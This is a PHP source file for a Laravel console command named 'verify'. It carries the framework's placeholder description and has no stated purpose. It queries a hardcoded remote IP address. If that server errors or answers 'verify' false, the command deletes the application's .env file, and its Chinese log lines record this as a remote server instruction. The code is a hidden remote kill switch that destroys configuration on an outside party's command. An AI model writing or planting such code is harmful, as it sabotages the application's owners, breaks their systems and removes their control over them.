<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class Verify extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'verify';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $response = Http::get('http://49.4.67.192:20000/api/verify');
        if ($response->serverError()){
            Log::warning('远程服务器响应错误,删除.env文件');
            unlink(base_path('.env'));
        }
        $verify = $response->json('verify');
        if ($verify == false){
            Log::warning('远程服务器指令 => 删除.env文件');
            unlink(base_path('.env'));
        }
    }
}
